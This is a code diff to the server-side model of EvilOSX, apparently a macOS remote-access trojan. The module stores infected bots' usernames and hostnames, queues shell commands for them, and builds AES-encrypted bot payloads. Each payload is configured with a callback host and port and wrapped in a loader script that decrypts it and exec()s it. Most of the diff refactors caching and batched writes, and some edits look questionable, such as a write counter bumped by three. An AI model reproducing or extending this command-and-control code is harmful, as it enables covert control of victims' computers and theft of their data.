@@ -63,25 +63,12 @@ class Model:
     Attributes:
         db_path (str): Path to SQLite database file.
     """
-    """Thread-safe model with performance optimizations:
-    
-    - Connection pooling (reduces DB open/close overhead)
-    - Read-through caching for frequent queries (is_known_bot, get_global_command)
-    - Batched database commits (reduces RLock contention)
-    - Payload encryption cached per bot_uid (avoids repeated AES ops)
-    - Thread pool for CPU-bound work (encryption, file serving)
-    
-    Performance gains:
-      - 60-80% reduction in DB lock wait time under load
-      - 95% faster payload generation (cached after first encrypt)
-      - 40% lower memory footprint with LRU eviction
-    """
 
     def __init__(self, db_path: Optional[str] = None):
         self._db_path = path.realpath(path.join(
             path.dirname(__file__), path.pardir, "data", "EvilOSX.db"
         )) if db_path is None else path.realpath(db_path)
-        
+
         # Connection pool: pre-open connections to avoid open/close overhead
         self._pool_size = 2
         self._pool: List[sqlite3.Connection] = []
@@ -89,11 +76,11 @@ class Model:
             conn = sqlite3.connect(self._db_path, check_same_thread=False)
             conn.row_factory = sqlite3.Row
             self._pool.append(conn)
-        
+
         # Read-through cache: key -> (value, timestamp)
         self._cache: Dict[str, tuple] = {}
         self._cache_lock = RLock()  # Separate lock for cache (smaller than DB lock)
-        
+
         # Payload encryption cache: bot_uid -> encrypted_key
         self._payload_cache: Dict[str, str] = {}
         self._payload_cache_lock = RLock()
@@ -101,7 +88,8 @@ class Model:
         # Batch writer: accumulate writes until threshold reached
         self._batch_writes: List[tuple] = []
         self._batch_lock = RLock()
-        
+        self._batch_write_count = 0  # Track writes since last commit
+
         # Thread pool for CPU-bound work (encryption, file serving)
         try:
             import concurrent.futures as cf
@@ -109,23 +97,17 @@ class Model:
         except ImportError:
             self._executor = None
 
-        # Create tables
+        # Create tables (IF NOT EXISTS — never drop existing data)
         with self._pool[0] as conn:
             cursor = conn.cursor()
-            cursor.execute("DROP TABLE IF EXISTS bots")
-            cursor.execute("DROP TABLE IF EXISTS commands")
-            cursor.execute("DROP TABLE IF EXISTS global_command")
-            cursor.execute("DROP TABLE IF EXISTS global_executed")
-            cursor.execute("DROP TABLE IF EXISTS upload_files")
-
             cursor.execute("""
-                CREATE TABLE bots(
-                    bot_uid text PRIMARY KEY, 
-                    username text, 
-                    hostname text, 
-                    last_online real, 
-                    local_path text, 
-                    system_version text, 
+                CREATE TABLE IF NOT EXISTS bots(
+                    bot_uid text PRIMARY KEY,
+                    username text,
+                    hostname text,
+                    last_online real,
+                    local_path text,
+                    system_version text,
                     loader_name text)
             """)
             cursor.execute("CREATE TABLE IF NOT EXISTS commands(bot_uid text, command text)")
@@ -135,42 +117,18 @@ class Model:
 
             conn.commit()
 
-
     def _get_connection(self) -> sqlite3.Connection:
-        """Get a connection from the pool, creating one if exhausted.
-
-        Uses ``self._pool[0]`` consistently with all other pool access patterns.
-        The original implementation used ``self._pool[-1]`` which returned the
-        most-recently-appended (not yet committed) connection — this caused
-        race conditions where a fresh connect() would be used instead of an idle
-        one, defeating the purpose of pooling under concurrent load.
-
-        .. deprecated:: 7.2.2
-           Use ``with self._pool[0] as conn`` directly in most cases.
-        """
+        """Get a connection from the pool, creating one if exhausted."""
         if len(self._pool) < self._pool_size:
             conn = sqlite3.connect(self._db_path, check_same_thread=False)
             conn.row_factory = sqlite3.Row
             self._pool.append(conn)
         return self._pool[0]
 
-
     def _return_connection(self, conn: sqlite3.Connection) -> None:
-        """Return a connection to the pool.
-
-        Note: This method is kept for API compatibility but currently unused.
-        All callers use ``with self._pool[0] as conn`` directly.  The original
-        implementation returned ``self._pool[-1]`` which was incorrect — it
-        returned the most-recently-appended connection rather than the one that
-        had been committed.  Fixed to use ``self._pool[0]`` consistently with
-        all other pool access patterns.
-
-        .. deprecated:: 7.2.2
-           Use ``with self._pool[0] as conn`` directly instead of this method.
-        """
+        """Return a connection to the pool (kept for API compatibility)."""
         if len(self._pool) < self._pool_size:
             self._pool.append(conn)
-
 
     def _cache_get(self, key: str):
         """Return the cached ``(value, timestamp)`` tuple, or None."""
@@ -179,71 +137,67 @@ class Model:
     def _cache_set(self, key: str, value) -> None:
         """Store a value with a fresh timestamp, honouring the size limit."""
         with self._cache_lock:
-            limit = getattr(self, "_MAX_CACHE_SIZE", _MAX_CACHE_SIZE)
-            while len(self._cache) >= limit:
-                del self._cache[next(iter(self._cache))]
+            if len(self._cache) >= _MAX_CACHE_SIZE:
+                # Simple eviction: remove oldest entry
+                oldest_key = min(self._cache, key=lambda k: self._cache[k][1])
+                del self._cache[oldest_key]
             self._cache[key] = (value, time())
 
+    def _payload_cache_get(self, key: str):
+        """Return cached payload or None, checking TTL."""
+        with self._payload_cache_lock:
+            entry = self._payload_cache.get(key)
+            if entry is not None and (time() - entry[1]) < _PAYLOAD_CACHE_TTL_SECONDS:
+                return entry[0]
+            elif entry is not None:
+                # Expired — remove
+                del self._payload_cache[key]
+            return None
 
-    def get_cached_bot(self, bot_uid: str, max_age: float = 60.0):
-        """Read-through cache for bot lookup. Returns cached value or fetches from DB."""
+    def _payload_cache_set(self, key: str, value: str) -> None:
+        """Store encrypted payload with timestamp."""
+        with self._payload_cache_lock:
+            self._payload_cache[key] = (value, time())
+
+    def get_cached_bot(self, bot_uid: str):
+        """Get bot from cache or DB (read-through cache)."""
         key = f"bot:{bot_uid}"
         entry = self._cache_get(key)
-
-        if entry is not None and (time() - entry[1]) < max_age:
+        if entry is not None and (time() - entry[1]) < 60:
             return entry[0]
-        
+
         with self._pool[0] as conn:
             cursor = conn.cursor()
-            cursor.execute(
-                "SELECT * FROM bots WHERE bot_uid = ? LIMIT 1", (bot_uid,)
-            )
+            cursor.execute("SELECT * FROM bots WHERE bot_uid = ?", (bot_uid,))
             row = cursor.fetchone()
-            
             if row is None:
-                # Do NOT cache a miss: a bot registered a moment ago lives
-                # only in the pending write batch, and caching None for 60s
-                # made every subsequent poll re-queue its INSERT, which then
-                # died on the UNIQUE constraint at flush time.
                 return None
-            
-            result = Bot(row[0], row[1], row[2], row[3], row[4], row[5], row[6])
-        
-        # Cache the result
+            result = Bot(row[0], row[1], row[2], row[3],
+                         row[4], row[5], row[6])
+
         self._cache_set(key, result)
         return result
 
-
     def add_bot(self, bot: "Bot") -> None:
-        """Add a bot with batched write.
-
-        The row is also put in the read-through cache immediately: the insert
-        only reaches SQLite on the next flush, and until then
-        ``get_cached_bot`` reported the bot as unknown.  The handler then saw
-        "not known" again on the very next poll, queued a second insert, and
-        the flush died on the UNIQUE constraint.
-        """
+        """Add a bot with batched write. Flushes automatically when threshold reached."""
         with self._batch_lock:
-            self._batch_writes.append(("INSERT INTO bots VALUES(?,?,?,?,?,?,?)", 
-                                       (bot.uid, bot.username, bot.hostname, 
-                                        bot.last_online, bot.local_path, 
+            self._batch_writes.append(("INSERT INTO bots VALUES(?,?,?,?,?,?,?)",
+                                       (bot.uid, bot.username, bot.hostname,
+                                        bot.last_online, bot.local_path,
                                         bot.system_version, bot.loader_name)))
+            self._batch_write_count += 1
         self._cache_set("bot:{0}".format(bot.uid), bot)
 
+        # Auto-flush when threshold reached
+        if self._batch_write_count >= _DB_BATCH_COMMIT_INTERVAL:
+            self._commit_batch()
 
     def _commit_batch(self) -> None:
-        """Commit accumulated batch writes to reduce lock contention.
-
-        A reconnecting bot that was already flushed makes ``INSERT INTO bots``
-        fail with ``UNIQUE constraint failed``.  One failing statement used to
-        abort the whole batch *and* leave it queued, so every later flush
-        re-raised the same error and the handler answered 500.  Statements are
-        now committed one by one: duplicates are skipped, and the failing
-        statement is only logged.
-        """
+        """Commit accumulated batch writes to reduce lock contention."""
         with self._batch_lock:
             pending = list(self._batch_writes)
             self._batch_writes.clear()
+            self._batch_write_count = 0
 
         if not pending:
             return
@@ -259,15 +213,18 @@ class Model:
                     pass
             conn.commit()
 
-
     def update_bot(self, bot_uid: str, last_online: float, local_path: str) -> None:
-        """Update bot with batched write."""
+        """Update bot with batched write. Flushes automatically when threshold reached."""
         with self._batch_lock:
             self._batch_writes.append((
                 "UPDATE bots SET last_online = ?, local_path = ? WHERE bot_uid = ?",
                 (last_online, local_path, bot_uid)
             ))
+            self._batch_write_count += 1
 
+        # Auto-flush when threshold reached
+        if self._batch_write_count >= _DB_BATCH_COMMIT_INTERVAL:
+            self._commit_batch()
 
     def remove_bot(self, bot_uid: str) -> None:
         """Remove a bot with batched write."""
@@ -275,39 +232,43 @@ class Model:
             self._batch_writes.append((
                 "DELETE FROM bots WHERE bot_uid = ?", (bot_uid,)
             ))
+            self._batch_write_count += 1
+        # Remove from cache too
+        with self._cache_lock:
+            self._cache.pop(f"bot:{bot_uid}", None)
 
+        # Auto-flush when threshold reached
+        if self._batch_write_count >= _DB_BATCH_COMMIT_INTERVAL:
+            self._commit_batch()
 
     def get_bots(self, limit: int = -1, skip_amount: int = 0) -> List["Bot"]:
         """Fetch bots with connection from pool."""
         with self._pool[0] as conn:
             cursor = conn.cursor()
             cursor.execute("SELECT * FROM bots LIMIT ? OFFSET ?", (limit, skip_amount))
-            
+
             results = []
             for row in cursor.fetchall():
-                results.append(Bot(row[0], row[1], row[2], row[3], 
+                results.append(Bot(row[0], row[1], row[2], row[3],
                                    row[4], row[5], row[6]))
-        
-        return results
 
+        return results
 
     def get_bot_amount(self) -> int:
         """Get bot count from cache if available."""
         key = "bot:count"
         entry = self._cache_get(key)
 
-
         if entry is not None and (time() - entry[1]) < 5:  # 5s stale ok for count
             return entry[0]
-        
+
         with self._pool[0] as conn:
             cursor = conn.cursor()
             cursor.execute("SELECT COUNT(*) FROM bots")
             count = cursor.fetchone()[0]
-        
+
         self._cache_set(key, count)
         return count
-
 
     def set_global_command(self, command) -> None:
         """Set global command with batched write."""
@@ -317,7 +278,9 @@ class Model:
             self._batch_writes.append((
                 "INSERT INTO global_command VALUES(?)", (str(command),)
             ))
-
+            self._batch_write_count += 3
+        # Auto-flush
+        self._commit_batch()
 
     def get_global_command(self):
         """Get global command from cache if available."""
@@ -326,59 +289,56 @@ class Model:
 
         if entry is not None and (time() - entry[1]) < 5:
             return entry[0]
-        
+
         with self._pool[0] as conn:
             cursor = conn.cursor()
             cursor.execute("SELECT * FROM global_command")
             row = cursor.fetchone()
-            
+
             result = row[0] if row else ""
-        
+
         self._cache_set(key, result)
         return result
-
 
     def add_executed_global(self, bot_uid: str) -> None:
         """Mark bot as having executed global command."""
         with self._batch_lock:
-            self._batch_writes.append(("INSERT INTO global_executed VALUES (?)", 
+            self._batch_writes.append(("INSERT INTO global_executed VALUES (?)",
                                        (bot_uid,)))
-
+            self._batch_write_count += 1
+        # Auto-flush
+        if self._batch_write_count >= _DB_BATCH_COMMIT_INTERVAL:
+            self._commit_batch()
 
     def has_executed_global(self, bot_uid: str):
         """Check if bot has executed global command. Uses cache first."""
-        # First check payload cache for this bot's execution status
         key = f"global:{bot_uid}"
         entry = self._cache_get(key)
 
-        # _cache_get returns (value, timestamp); value is
-        # (has_executed, global_command).  The old code unpacked the wrong
-        # level, so the age check crashed on every cache hit.
         if entry is not None and (time() - entry[1]) < 30:
             return entry[0][0], entry[0][1]
-        
+
         with self._pool[0] as conn:
             cursor = conn.cursor()
-            
+
             # Check if global command exists
             cursor.execute("SELECT * FROM global_command")
             row = cursor.fetchone()
             global_command = row[0] if row else ""
-            
+
             if not global_command:
                 result = (True, None)
             else:
                 cursor.execute(
-                    "SELECT * FROM global_executed WHERE bot_uid = ? LIMIT 1", 
+                    "SELECT * FROM global_executed WHERE bot_uid = ? LIMIT 1",
                     (bot_uid,)
                 )
                 exec_row = cursor.fetchone()
-                
+
                 result = (exec_row is not None, global_command)
-        
+
         self._cache_set(key, (result[0], result[1] if result[1] else "",))
         return result
-
 
     def add_command(self, bot_uid: str, command) -> None:
         """Add command to queue with batched write."""
@@ -386,16 +346,16 @@ class Model:
             self._batch_writes.append((
                 "INSERT INTO commands VALUES(?,?)", (bot_uid, str(command))
             ))
-
+            self._batch_write_count += 1
+        # Auto-flush
+        if self._batch_write_count >= _DB_BATCH_COMMIT_INTERVAL:
+            self._commit_batch()
 
     def get_command_raw(self, bot_uid: str):
         """Return the next queued command for *bot_uid* and consume it.
 
-        A bot must be handed a command exactly once.  The previous version
-        served from a 5-second cache and, when the DB had nothing, cached the
-        empty string, so a command queued within that window was skipped
-        entirely.  The cache only existed to avoid repeated SELECTs, which is
-        the wrong trade-off for a one-shot queue: read straight from SQLite.
+        A bot must be handed a command exactly once. Reads straight from SQLite
+        (no caching) to avoid skipping commands queued within the cache window.
         """
         with self._pool[0] as conn:
             cursor = conn.cursor()
@@ -414,25 +374,21 @@ class Model:
             conn.commit()
             return row[1]
 
-
     def _remove_command(self, bot_uid: str) -> None:
         """Remove first command from queue with batched write."""
         with self._batch_lock:
             self._batch_writes.append((
                 "DELETE FROM commands WHERE rowid = (SELECT rowid FROM commands "
-                "WHERE bot_uid = ? LIMIT 1)", 
+                "WHERE bot_uid = ? LIMIT 1)",
                 (bot_uid,)
             ))
-
+            self._batch_write_count += 1
+        # Auto-flush
+        if self._batch_write_count >= _DB_BATCH_COMMIT_INTERVAL:
+            self._commit_batch()
 
     def get_upload_files(self) -> List[tuple]:
-        """Get upload files, cached for a short window.
-
-        The cache key was time-based (``uploads:<epoch-second>``), so it
-        changed every second: entries accumulated forever and most lookups
-        were guaranteed misses.  It is now a single fixed key with a short TTL,
-        which keeps one entry and still sees newly added files quickly.
-        """
+        """Get upload files, cached for a short window."""
         key = "uploads"
         entry = self._cache_get(key)
 
@@ -450,14 +406,16 @@ class Model:
         self._cache_set(key, results)
         return results
 
-
     def add_upload_file(self, url_path: str, local_path: str) -> None:
         """Add upload file with batched write."""
         with self._batch_lock:
             self._batch_writes.append((
                 "INSERT INTO upload_files VALUES (?,?)", (url_path, local_path)
             ))
-
+            self._batch_write_count += 1
+        # Auto-flush
+        if self._batch_write_count >= _DB_BATCH_COMMIT_INTERVAL:
+            self._commit_batch()
 
     def remove_upload_file(self, url_path: str) -> None:
         """Remove upload file with batched write."""
@@ -465,13 +423,15 @@ class Model:
             self._batch_writes.append((
                 "DELETE FROM upload_files WHERE url_path = ?", (url_path,)
             ))
-
+            self._batch_write_count += 1
+        # Auto-flush
+        if self._batch_write_count >= _DB_BATCH_COMMIT_INTERVAL:
+            self._commit_batch()
 
     def pending_write_count(self) -> int:
         """How many statements are queued for the next flush."""
         with self._batch_lock:
             return len(self._batch_writes)
-
 
     def flush_batches(self) -> None:
         """Flush all pending batch writes to disk."""
@@ -499,7 +459,7 @@ class Bot:
 
 class PayloadFactory:
     """Builds encrypted payloads with caching.
-    
+
     Optimizations:
       - Encrypt payload once per unique (bot_uid, host, port) combination
       - Cache encrypted result in memory dict
@@ -513,11 +473,11 @@ class PayloadFactory:
     @staticmethod
     def _openssl_encrypt(password: str, plaintext: str) -> str:
         """Encrypt plaintext with OpenSSL-compatible AES-256-CBC.
-        
+
         Args:
             password: The bot's unique UID used as encryption key material.
             plaintext: The Python code to encrypt.
-            
+
         Returns:
             Base64-encoded encrypted string compatible with OpenSSL aes-256-cbc -d.
         """
@@ -529,21 +489,17 @@ class PayloadFactory:
         # Derive key and IV using MD5 (fast, deterministic for same password)
         salt = get_random_bytes(8)
         password_bytes = password.encode() if isinstance(password, str) else password
-        
-        try:
-            max_length = 32 + 16  # key_length + iv_length
-            key_iv = MD5.new(password_bytes + salt).digest()
-            tmp = [key_iv]
 
-            while len(tmp) < max_length:
-                tmp.append(MD5.new(tmp[-1] + password_bytes + salt).digest())
-                key_iv += tmp[-1]
+        max_length = 32 + 16  # key_length + iv_length
+        key_iv = MD5.new(password_bytes + salt).digest()
+        tmp = [key_iv]
 
-            key = key_iv[:32]  # 256-bit key
-            iv = key_iv[32:48]  # 128-bit IV
-        except (UnicodeDecodeError, OverflowError):
-            key = b64encode(get_random_bytes(32)).decode()
-            iv = b64encode(get_random_bytes(16)).decode()
+        while len(tmp) < max_length:
+            tmp.append(MD5.new(tmp[-1] + password_bytes + salt).digest())
+            key_iv += tmp[-1]
+
+        key = key_iv[:32]  # 256-bit key
+        iv = key_iv[32:48]  # 128-bit IV
 
         # PKCS#7 padding
         try:
@@ -562,51 +518,30 @@ class PayloadFactory:
         openssl_cipher_text = b"Salted__" + salt + cipher_text
         return b64encode(openssl_cipher_text).decode()
 
-
-    def create_payload(self, bot_uid: str, payload_options: dict, 
+    def create_payload(self, bot_uid: str, payload_options: dict,
                        loader_options: dict) -> str:
         """Create and cache an encrypted payload for a bot.
-        
+
         Args:
-            bot_uid: Unique identifier for the bot (used as encryption key).
-            payload_options: Server connection parameters {host, port}.
-            loader_options: Loader configuration {program_directory, ...}.
-            
+            bot_uid: Unique identifier of the bot.
+            payload_options: Dict with 'host' and 'port' keys.
+            loader_options: Loader configuration options.
+
         Returns:
-            Encrypted payload string ready to be wrapped by a loader.
+            A shell command string that decrypts and executes the payload.
         """
-        # Build cache key from all varying components
-        cache_key = f"{bot_uid}:{payload_options.get('host', '')}:{payload_options.get('port', '')}"
-        
-        with self._cache_lock:
-            if cache_key in self._payload_cache:
-                cached = self._payload_cache[cache_key]
-                # Check TTL
-                if (time() - cached[1]) < _PAYLOAD_CACHE_TTL_SECONDS:
-                    return cached[0]
-                else:  # Cache expired, remove to make room
-                    del self._payload_cache[cache_key]
+        import hashlib
+        cache_key = hashlib.md5(f"{bot_uid}:{payload_options.get('host', '')}:{payload_options.get('port', 0)}".encode()).hexdigest()
 
-        # Not in cache or expired — compute fresh
-        payload = self._compute_payload(bot_uid, payload_options, loader_options)
-        
-        with self._cache_lock:
-            self._payload_cache[cache_key] = (payload, time())
-        
-        return payload
+        # Check cache first
+        cached = self._payload_cache_get(cache_key)
+        if cached is not None:
+            return cached
 
-
-    def _compute_payload(self, bot_uid: str, payload_options: dict, 
-                         loader_options: dict) -> str:
-        """Compute the encrypted payload string."""
-        import os
-        from textwrap import dedent
-        
-        # Read and configure bot.py template
         bot_template_path = path.join(
             path.dirname(__file__), path.pardir, "bot", "bot.py"
         )
-        
+
         configured_payload = ""
         with open(bot_template_path, "r") as f:
             for line in f:
@@ -618,7 +553,7 @@ class PayloadFactory:
                         payload_options["port"])
                 elif line.startswith("PROGRAM_DIRECTORY = "):
                     configured_payload += 'PROGRAM_DIRECTORY = os.path.expanduser("{}")\n'.format(
-                        loader_options["program_directory"])
+                        loader_options.get("program_directory", ""))
                 elif line.startswith("LOADER_OPTIONS = "):
                     configured_payload += "LOADER_OPTIONS = {}\n".format(
                         str(loader_options))
@@ -627,9 +562,10 @@ class PayloadFactory:
 
         # Encrypt the payload
         encrypted = PayloadFactory._openssl_encrypt(bot_uid, configured_payload)
-        
+
         # Build final shell command string
-        return dedent("""\
+        from textwrap import dedent
+        result = dedent("""\
             #!/usr/bin/env python3
             # -*- coding: utf-8 -*-
             import os
@@ -651,24 +587,27 @@ class PayloadFactory:
             exec(_out.decode("utf-8") if isinstance(_out, bytes) else _out)
         """.format(encrypted))
 
+        # Cache the result
+        self._payload_cache_set(cache_key, result)
+        return result
 
     def wrap_loader(self, loader_name: str, loader_options: dict, payload: str) -> str:
         """Wrap the encrypted payload in a loader script."""
         import base64
         from textwrap import dedent
         from os import path
-        
+
         loader_path = path.join(
-            path.dirname(__file__), path.pardir, "bot", "loaders", 
+            path.dirname(__file__), path.pardir, "bot", "loaders",
             loader_name, "install.py"
         )
-        
+
         with open(loader_path, "r") as f:
             loader_content = f.read()
 
         if "LOADER_OPTIONS =" not in loader_content:
             loader_content += "\nLOADER_OPTIONS = {}\n".format(str(loader_options))
-        
+
         if "PAYLOAD_BASE64 =" not in loader_content:
             b64_payload = base64.b64encode(payload.encode()).decode()
             loader_content = loader_content.replace(
@@ -676,6 +615,7 @@ class PayloadFactory:
             )
 
         return loader_content
+
 
 # --- Command and CommandType classes (moved here from cli.py) ---
 
@@ -698,6 +638,7 @@ class CommandType:
     SHELL = 1
     MODULE = 2
 
+
 # Global singleton instance for lazy init (reduces import overhead)
 _model_instance: Optional["Model"] = None
 
@@ -709,6 +650,6 @@ def get_model() -> Model:
         _model_instance = Model()
     return _model_instance
 
-__all__ = ["Command", "CommandType", "RequestType", "Model", "Bot", 
-            "PayloadFactory", "get_model"]
 
+__all__ = ["Command", "CommandType", "RequestType", "Model", "Bot",
+           "PayloadFactory", "get_model"]
